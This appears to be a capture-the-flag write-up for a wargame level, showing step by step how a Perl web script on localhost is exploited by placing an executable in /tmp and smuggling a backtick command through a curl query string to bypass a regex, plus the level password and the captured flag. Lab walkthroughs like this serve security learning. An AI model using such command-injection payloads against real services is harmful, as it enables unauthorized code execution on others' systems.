# level12

## Vulnerability: Bad input checking

level12's password: `fa6v5ateaw21peobuub8ipe6s`

we got some intel from level00

```shell
dr-xr-x---  2 flag12 level12  33 Mar 12  2016 level12

/var/www/level12

/rofs/var/www/level12
```

1. examinate existing files and permissions

```shell
ls -la
ls -la /var/www/level12/level12.pl
cat /var/www/level12/level12.pl
```

shows a perl script that is supposed to run on localhost:4646 as flag12:level12

2. try to connect to it with netcat

```shell
nc localhost 4646
```

waits for an input, and replies `..` as expected when given a random input

3. create a custom file with an uppercase name to trick regex to match

```shell
echo "getflag > /tmp/flag" > /tmp/PWN
chmod +x /tmp/PWN
```

4. inject some code and pwn the flag

```shell
curl 'localhost:4646?x=`/*/PWN`'
cat /tmp/flag
```

gives flag: `g1qKMiRpXf53AWhDaU7FEkczr`
